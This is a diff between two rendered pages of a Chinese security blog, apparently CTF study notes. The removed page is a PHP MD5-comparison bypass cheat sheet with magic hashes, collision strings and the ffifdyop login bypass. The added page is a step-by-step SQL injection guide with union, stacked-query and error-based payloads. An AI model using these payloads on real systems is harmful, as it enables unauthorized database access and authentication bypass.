@@ -16,28 +16,26 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="&lt;a href=&#34;https://blog.csdn.net/m0_75178803&#34;&gt;访白鹿&lt;/a&gt;">
+  <meta name="author" content="ccnyy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="相关口诀 数组绕过，0e绕过 QNKCDZO 240610708 常用 md5($a)&#x3D;&#x3D;md5(md5($a)) 0e215962017 MD5加密登录万能通用 ffifdyop  数组绕过(通用)payload：?a[]&#x3D;1&amp;b[]&#x3D;2 md5弱比较转换规则：   1.字符型和字符型比较，为同类型，比较其内容，例’’abc’’&#x3D;&amp;#x3">
+    <meta name="description" content="SQL注入攻击1. 注入点识别 POST请求：使用 # 注释符，最好用 %23 代替。 GET请求：使用 --+ 注释符。 ID错误：使用错误的ID以覆盖回显。  2. 确定列数使用以下语句通过判断有无报错来确定列数： 1231&#x27; order by 1#1&#x27; order by 2#1&#x27; order by 3#  3. 判断回显位使用以下语句判断回显位： 11&amp;#x27">
 <meta property="og:type" content="article">
-<meta property="og:title" content="md5绕过">
-<meta property="og:url" content="http://page.ccnyy.top/2025/01/21/md5%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:title" content="SQL注入攻击">
+<meta property="og:url" content="http://page.ccnyy.top/2025/01/21/sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="CNYのBlog">
-<meta property="og:description" content="相关口诀 数组绕过，0e绕过 QNKCDZO 240610708 常用 md5($a)&#x3D;&#x3D;md5(md5($a)) 0e215962017 MD5加密登录万能通用 ffifdyop  数组绕过(通用)payload：?a[]&#x3D;1&amp;b[]&#x3D;2 md5弱比较转换规则：   1.字符型和字符型比较，为同类型，比较其内容，例’’abc’’&#x3D;&amp;#x3">
+<meta property="og:description" content="SQL注入攻击1. 注入点识别 POST请求：使用 # 注释符，最好用 %23 代替。 GET请求：使用 --+ 注释符。 ID错误：使用错误的ID以覆盖回显。  2. 确定列数使用以下语句通过判断有无报错来确定列数： 1231&#x27; order by 1#1&#x27; order by 2#1&#x27; order by 3#  3. 判断回显位使用以下语句判断回显位： 11&amp;#x27">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://page.ccnyy.top/tp/7058fe431c37d69d0b7ac16230b168e3.png">
 <meta property="article:published_time" content="2025-01-21T15:19:05.000Z">
-<meta property="article:modified_time" content="2025-01-24T07:09:35.610Z">
+<meta property="article:modified_time" content="2025-01-24T07:17:49.902Z">
 <meta property="article:author" content="ccnyy">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="php">
+<meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://page.ccnyy.top/tp/7058fe431c37d69d0b7ac16230b168e3.png">
   
   
   
-  <title>md5绕过 - CNYのBlog</title>
+  <title>SQL注入攻击 - CNYのBlog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="md5绕过"></span>
+            <span id="subtitle" data-typed-text="SQL注入攻击"></span>
           
         </div>
 
@@ -226,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k 字
+          502 字
         
       </span>
     
@@ -237,7 +235,7 @@
         
         
         
-          12 分钟
+          5 分钟
         
       </span>
     
@@ -274,7 +272,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">md5绕过</h1>
+            <h1 id="seo-header">SQL注入攻击</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
@@ -287,97 +285,55 @@
             
               <div class="markdown-body">
                 
-                <h1 id="相关口诀"><a href="#相关口诀" class="headerlink" title="相关口诀"></a>相关口诀</h1><blockquote>
-<p>数组绕过，0e绕过</p>
-<p>QNKCDZO 240610708 常用</p>
-<p>md5($a)&#x3D;&#x3D;md5(md5($a))</p>
-<p>0e215962017</p>
-<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=MD5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">MD5加密</a>登录万能通用</p>
-<p>ffifdyop</p>
-</blockquote>
-<h1 id="数组绕过-通用"><a href="#数组绕过-通用" class="headerlink" title="数组绕过(通用)"></a>数组绕过(通用)</h1><p>payload：?a[]&#x3D;1&amp;b[]&#x3D;2</p>
-<h1 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h1><h2 id="转换规则："><a href="#转换规则：" class="headerlink" title="转换规则："></a>转换规则：</h2><p>   1.字符型和字符型比较，为同类型，比较其内容，例’’abc’’&#x3D;&#x3D;’’c’’ &#x3D;&gt; false</p>
-<p>   2.数字型和数字型比较，同上，例：123 &#x3D;&#x3D; 12 &#x3D;&gt; false</p>
-<pre><code class="hljs">                                                     123 ==123=&gt; true
-</code></pre>
-<p>   3.字符型和数字型比较，若字符型值开头为数字，转为数字；</p>
-<pre><code class="hljs">                                      若开头不为数字，为 null 弱比较与 0 相等。
+                <h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><h2 id="1-注入点识别"><a href="#1-注入点识别" class="headerlink" title="1. 注入点识别"></a>1. 注入点识别</h2><ul>
+<li><strong>POST请求</strong>：使用 <code>#</code> 注释符，最好用 <code>%23</code> 代替。</li>
+<li><strong>GET请求</strong>：使用 <code>--+</code> 注释符。</li>
+<li><strong>ID错误</strong>：使用错误的ID以覆盖回显。</li>
+</ul>
+<h2 id="2-确定列数"><a href="#2-确定列数" class="headerlink" title="2. 确定列数"></a>2. 确定列数</h2><p>使用以下语句通过判断有无报错来确定列数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1#</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span>#<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3#</span><br></code></pre></td></tr></table></figure>
 
-                                   例：&#39;&#39;abc123&#39;&#39;==123 =&gt; false
+<h2 id="3-判断回显位"><a href="#3-判断回显位" class="headerlink" title="3. 判断回显位"></a>3. 判断回显位</h2><p>使用以下语句判断回显位：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3#</span><br></code></pre></td></tr></table></figure>
 
-                                          &quot;123abc&quot;==123 =&gt; true
+<h2 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4. 获取数据库名"></a>4. 获取数据库名</h2><p>将 <code>database()</code> 放到回显位，其余位置用 <code>&#39;&#39;</code> 代替：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,database()#</span><br></code></pre></td></tr></table></figure>
 
-                                          &#39;&#39;abc123&#39;&#39;==0 =&gt; true
+<p>或</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,database()&#x27;</span><br></code></pre></td></tr></table></figure>
 
-                                          &#39;&#39;123&#39;&#39;==123 =&gt; true
+<h2 id="5-获取数据表名"><a href="#5-获取数据表名" class="headerlink" title="5. 获取数据表名"></a>5. 获取数据表名</h2><p>使用以下语句获取数据库下的所有数据表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,table_name from information_schema.tables where table_schema=&#x27;</span>news<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
 
-                                         &#39;&#39;123abc&#39;&#39;==12 =&gt; false
-</code></pre>
-<h2 id="字符型和数值型的弱比较"><a href="#字符型和数值型的弱比较" class="headerlink" title="字符型和数值型的弱比较"></a>字符型和数值型的弱比较</h2><pre><code class="hljs">  比较原理：
+<p>如果有多个数据表，使用 <code>group_concat(table_name)</code>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></code></pre></td></tr></table></figure>
 
-  先看字符串开头是否为数字
+<h2 id="6-获取字段名"><a href="#6-获取字段名" class="headerlink" title="6. 获取字段名"></a>6. 获取字段名</h2><p>使用以下语句获取某个表的所有字段名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>secret_table<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
 
-                如果为数字，则截止到连续数字的最后一个数字，即&quot;123abc456&quot;=&gt;123
+<h2 id="7-获取表内容"><a href="#7-获取表内容" class="headerlink" title="7. 获取表内容"></a>7. 获取表内容</h2><p>使用以下语句获取表内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,group_concat(fl4g) from secret_table#</span><br></code></pre></td></tr></table></figure>
 
-                如果不为数字，则判断为false，即&quot;abc123456&quot;=&gt;0
-</code></pre>
-<p>实例：</p>
-<p>(“123abc”&#x3D;&#x3D;123) &#x3D;&gt; true</p>
-<p>(“123”&#x3D;&#x3D;123) &#x3D;&gt; true</p>
-<p>(“123abc”&#x3D;&#x3D;”123”) &#x3D;&gt; false</p>
-<p>(“abc123”&#x3D;&#x3D;0) &#x3D;&gt; true</p>
-<h2 id="字符型和字符型的比较"><a href="#字符型和字符型的比较" class="headerlink" title="字符型和字符型的比较"></a>字符型和字符型的比较</h2><p>​      字符串的弱比较只能采用0e绕过，需要注意的是，0e后面不能有字母的存在</p>
-<p>实例：</p>
-<p>（”0e123456”&#x3D;&#x3D;”0e345”） &#x3D;&gt; true</p>
-<p>（”0e12adfc”&#x3D;&#x3D;”0e345”） &#x3D;&gt; false</p>
-<h2 id="布尔型和任意值的比较"><a href="#布尔型和任意值的比较" class="headerlink" title="布尔型和任意值的比较"></a>布尔型和任意值的比较</h2><pre><code class="hljs">布尔值true和任意字符串和数值都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的
-</code></pre>
-<p>实例：</p>
-<p>(true&#x3D;&#x3D;’’false’’) &#x3D;&gt; false</p>
-<p>(0&#x3D;&#x3D;’’false’’) &#x3D;&gt; true</p>
-<p>(true&#x3D;&#x3D;0) &#x3D;&gt; false</p>
-<p>(true&#x3D;&#x3D;’’abc’’) &#x3D;&gt;true</p>
-<p>(true&#x3D;&#x3D;’’123abc’’) &#x3D;&gt;true</p>
-<h1 id="md5弱类型绕过"><a href="#md5弱类型绕过" class="headerlink" title="md5弱类型绕过"></a>md5弱类型绕过</h1><h2 id="0e绕过"><a href="#0e绕过" class="headerlink" title="0e绕过"></a>0e绕过</h2><h3 id="0e绕过的原理"><a href="#0e绕过的原理" class="headerlink" title="0e绕过的原理"></a>0e绕过的原理</h3><p>科学记数法是一种记数的方法。</p>
-<p>计算器表达10的幂一般是用E或e</p>
-<p>如：2 760 000   &#x3D;    2.76×10^6    &#x3D;    2.76e6</p>
-<p>所以0e，无论后面跟什么值，都是0</p>
-<h4 id="常见的字符串md5值为0e开头"><a href="#常见的字符串md5值为0e开头" class="headerlink" title="常见的字符串md5值为0e开头"></a>常见的字符串md5值为0e开头</h4><p>加密后的密文                      原值</p>
-<p>QNKCDZO           0E830400451993494058024219903391<br>240610708           0E462097431906509019562988736854<br>s878926199a       0E545993274517709034328855841020<br>s155964671a       0E342768416822451524974117254469<br>s214587387a       0E848240448830537924465865611904</p>
-<p>0x01 一次md5的加密<br>$a&#x3D;$_GET[‘a’];</p>
-<p>$b&#x3D;$_GET[‘b’];</p>
-<p>md5($a)&#x3D;&#x3D;md5($b)</p>
-<p>payload：?a&#x3D;QNKCDZO&amp;b&#x3D;240610708</p>
-<p>0x02 一次md5的加密<br>$a&#x3D;$_GET[‘a’];</p>
-<p>$a&#x3D;&#x3D;md5($a);</p>
-<p>payload：?a&#x3D;0e215962017</p>
-<p>因为md5(“0e215962017”)&#x3D;0e291242476940776845150308577824</p>
-<p>0x03 两次md5的加密<br>$a&#x3D;$_GET[‘a’];</p>
-<p>$a&#x3D;&#x3D;md5($a);</p>
-<p>payload：?md5(md5(0E830400451993494058024219903391))&#x3D;0E545993274517709034328855841020</p>
-<h1 id="md5强类型绕过"><a href="#md5强类型绕过" class="headerlink" title="md5强类型绕过"></a>md5强类型绕过</h1><h2 id="md5值完全相同的字符绕过"><a href="#md5值完全相同的字符绕过" class="headerlink" title="md5值完全相同的字符绕过"></a>md5值完全相同的字符绕过</h2><p>$a&#x3D;$_GET[‘a’];</p>
-<p>$b&#x3D;$_GET[‘b’];</p>
-<p>md5($a)&#x3D;&#x3D;&#x3D;md5($b)</p>
-<p>payload：?a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
-<h3 id="两个MD5值完全相同的字符"><a href="#两个MD5值完全相同的字符" class="headerlink" title="两个MD5值完全相同的字符"></a>两个MD5值完全相同的字符</h3><p>array1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p>
-<p>array2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
-<h3 id="此时插入sha1值完全相同的字符"><a href="#此时插入sha1值完全相同的字符" class="headerlink" title="此时插入sha1值完全相同的字符"></a>此时插入sha1值完全相同的字符</h3><p>array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</p>
-<p>array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%</p>
-<h1 id="万能通式ffifdyop-绕过"><a href="#万能通式ffifdyop-绕过" class="headerlink" title="万能通式ffifdyop 绕过"></a>万能通式ffifdyop 绕过</h1><p>万能通式：129581926211651571912466741651878684928和ffifdyop</p>
-<p>实例：</p>
-<p>select * from ‘admin’ where password&#x3D;md5($pass,true)</p>
-<p>输入md5(‘ffifdyop’,true)绕过</p>
-<p>即</p>
-<p>select * from ‘admin’ where password&#x3D;md5 ( ‘ ffifdyop ‘ ,true)</p>
-<p>md5(string,raw)</p>
-<p><img src="/../../../../tp/7058fe431c37d69d0b7ac16230b168e3.png" srcset="/img/loading.gif" lazyload alt="7058fe431c37d69d0b7ac16230b168e3"></p>
-<p>ffifdyop 这个字符串被 md5 哈希了后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是’ or ‘6<br>而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password&#x3D; ‘  ‘ or ‘6xxxxx ‘，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p>
-<p>where password&#x3D;正确的密码or 1 ，代表永真，那么前面有没有密码都无所谓了</p>
-<p>简单说，</p>
-<p>select * from admin where password&#x3D; ‘    ‘  or’6&lt;乱码&gt;’</p>
-<p>就相当于</p>
-<p>select * from admin where password&#x3D;  ‘    ‘      or 1  实现sql注入</p>
-<p>当两个条件中有任一个条件满足，“逻辑或”的运算结果就为“真”</p>
+<h2 id="8-使用-LIMIT-获取特定数据"><a href="#8-使用-LIMIT-获取特定数据" class="headerlink" title="8. 使用 LIMIT 获取特定数据"></a>8. 使用 <code>LIMIT</code> 获取特定数据</h2><p>使用 <code>LIMIT</code> 获取特定数据：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,group_concat(fl4g) from secret_table limit 3,1#</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="9-改名操作"><a href="#9-改名操作" class="headerlink" title="9. 改名操作"></a>9. 改名操作</h2><p>猜测回显的数据库表字段，改变表名使回显到 <code>flag</code> 字段：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;alter table words rename words1; alter table `1919810931114514` rename words; alter table words change flag id varchar(100);#</span><br></code></pre></td></tr></table></figure>
+
+<p>使用以下语句得到回显：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1;#</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="10-空格绕过"><a href="#10-空格绕过" class="headerlink" title="10. 空格绕过"></a>10. 空格绕过</h2><p>使用 <code>/**/</code> 代替空格或使用 <code>()</code>，<code>()</code> 两边不用空格：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">where</span>(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<h2 id="11-报错注入"><a href="#11-报错注入" class="headerlink" title="11. 报错注入"></a>11. 报错注入</h2><h3 id="11-1-extractvalue-报错注入"><a href="#11-1-extractvalue-报错注入" class="headerlink" title="11.1 extractvalue() 报错注入"></a>11.1 <code>extractvalue()</code> 报错注入</h3><p><code>extractvalue()</code> 函数用于从XML文档中提取数据。通过构造错误的XPath表达式，可以触发报错并获取信息。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-number">0x7e</span>, database()));<br></code></pre></td></tr></table></figure>
+
+<h3 id="11-2-为什么使用-0x7e"><a href="#11-2-为什么使用-0x7e" class="headerlink" title="11.2 为什么使用 0x7e"></a>11.2 为什么使用 <code>0x7e</code></h3><p><code>0x7e</code> 是ASCII码中的 <code>~</code> 符号，XPath语法不支持该符号，因此总能触发报错。其他不支持的字符如 <code>!</code> 也可以使用。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-number">0x7e</span>, database()));<br></code></pre></td></tr></table></figure>
+
+<h3 id="11-3-其他报错注入方法"><a href="#11-3-其他报错注入方法" class="headerlink" title="11.3 其他报错注入方法"></a>11.3 其他报错注入方法</h3><p>使用其他不支持的字符也可以达到同样的效果：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-string">&#x27;!&#x27;</span>, database()));<br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -392,7 +348,7 @@
       
         <a href="/tags/web/" class="print-no-link">#web</a>
       
-        <a href="/tags/php/" class="print-no-link">#php</a>
+        <a href="/tags/sql/" class="print-no-link">#sql</a>
       
     </div>
   
@@ -404,14 +360,14 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>md5绕过</div>
-      <div>http://page.ccnyy.top/2025/01/21/md5绕过/</div>
+      <div>SQL注入攻击</div>
+      <div>http://page.ccnyy.top/2025/01/21/sql注入/</div>
     </div>
     <div class="license-meta">
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_75178803">访白鹿</a></div>
+          <div>ccnyy</div>
         </div>
       
       
@@ -454,9 +410,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">
+                      <a href="/2025/01/21/md5%E7%BB%95%E8%BF%87/" title="md5绕过">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">php伪协议</span>
+                        <span class="hidden-mobile">md5绕过</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -464,8 +420,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/01/21/sql%E6%B3%A8%E5%85%A5/" title="SQL注入攻击">
-                        <span class="hidden-mobile">SQL注入攻击</span>
+                      <a href="/2025/01/21/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
